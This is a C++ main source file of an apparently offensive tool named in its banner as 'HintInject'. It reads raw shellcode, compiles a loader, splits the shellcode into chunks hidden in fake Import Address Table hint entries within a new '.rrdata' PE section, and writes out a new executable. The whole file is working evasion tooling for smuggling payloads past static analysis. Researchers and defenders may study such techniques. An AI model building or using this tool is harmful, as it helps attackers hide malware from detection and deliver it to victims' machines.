#include <Windows.h>
#include <iostream>
#include <time.h>
#include "Utils.h"
#include "FakeEntry.h"
void PrintBanner() {
	LPCSTR banner =
		"                                                                      \n"
		",--.  ,--.,--.          ,--.  ,--.          ,--.               ,--.   \n"
		"|  '--'  |`--',--,--, ,-'  '-.|  |,--,--,   `--' ,---.  ,---.,-'  '-. \n"
		"|  .--.  |,--.|      \\'-.  .-'|  ||      \\  ,--.| .-. :| .--''-.  .-' \n"
		"|  |  |  ||  ||  ||  |  |  |  |  ||  ||  |  |  |\\   --.\\ `--.  |  |   \n"
		"`--'  `--'`--'`--''--'  `--'  `--'`--''--'.-'  / `----' `---'  `--'   \n"
		"                                          '---'                       \n";
	std::cout << banner << std::endl;
}

void PrintHelp(LPCSTR exeName) {
	std::cout << "[+] Usage: " << exeName << " <Shellcode File> <Output Name>";
}


int main(int argc, char* argv[]) {
	PrintBanner();
	if (argc != 3) {
		PrintHelp(argv[0]);
		return -1;
	}
	srand(time(NULL));
	size_t shellcodeSize = 0;
	size_t loaderSize = 0;
	size_t newPESize = 0;
	uint64_t numberOfChunks = 0;
	// Read the shellcode file
	PBYTE shellcodeContent = ReadFileFromDisk(argv[1], shellcodeSize);
	if (shellcodeContent == NULL || shellcodeSize == 0) {
		std::cout << "[!] Error on reading the shellcode file !" << std::endl;
		return -1;
	}
	std::cout << "[+] Shellcode file is read !" << std::endl;
	// Compile the loader binary and get the path of it, later we will append new fake entries to that binary
	LPCSTR loaderPath = CompileLoader();
	if (loaderPath == NULL) {
		std::cout << "[!] Error on loader compilation !" << std::endl;
		return -1;
	}
	std::cout << "[+] Loader binary is compiled !" << std::endl;
	// From the path, read the binary
	PBYTE loaderContent = ReadFileFromDisk(loaderPath, loaderSize);
	if (loaderContent == NULL || loaderSize == 0) {
		std::cout << "[!] Error on reading the loader binary !" << std::endl;
		return -1;
	}
	std::cout << "[+] Compiled binary is read !" << std::endl;
	// Since each hint field is 2 bytes, we can split it, also pad it
	PBYTE hintArray = SplitShellcode(shellcodeContent, shellcodeSize, numberOfChunks);
	if (hintArray == NULL || numberOfChunks == 0) {
		std::cout << "[!] Splitting shellcode problem !" << std::endl;
		return -1;
	}
	std::cout << "[+] Number of entries required to store shellcode is " << numberOfChunks << std::endl;
	HeapFree(GetProcessHeap(),0,shellcodeContent);
	// Add a new section to our loader binary named .rrdata
	PBYTE newPeFileContent = AddNewSection(loaderContent, loaderSize, numberOfChunks, newPESize);
	if (newPeFileContent == NULL || newPESize == 0) {
		std::cout << "[!] Appending new section problem !" << std::endl;
		return -1;
	}
	std::cout << "[+] .rrdata section is added !" << std::endl;
	// By using the new section, clone the existing IAT and fake ones to this section
	AddNewImportEntry(newPeFileContent,(PWORD) hintArray, numberOfChunks);
	std::cout << "[+] Fake entries appended to the original IAT" << std::endl;
	// Write the new PE file to the disk
	if (!WriteNewPE(argv[2], newPeFileContent, newPESize)) {
		std::cout << "[!] Error on writing to " << argv[2]<< std::endl;
		return -1;
	}
	std::cout << "[+] New PE file is written to " << argv[2] << std::endl;
 	return 0;
}